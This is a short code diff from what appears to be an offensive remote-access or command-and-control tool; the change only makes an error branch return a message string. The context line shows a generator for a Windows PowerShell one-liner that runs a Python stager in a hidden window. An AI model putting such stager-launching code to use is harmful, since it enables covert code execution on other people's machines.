@@ -341,8 +341,7 @@ class Main:
         elif os == 'ps':  # Windows one-liner (uses `" to escape inline double-quotes)
             return 'Start-Process -FilePath "python" -Verb open -WindowStyle Hidden -ArgumentList "-c {}"'.format('exec(`\"`\"`\"{}`\"`\"`\")'.format(python_stager))
         else:
-            self.print('Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(os))
-            return False
+            return 'Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(os)
 
     def get_ssh_user(self, ssh_username):
         user_id = ''
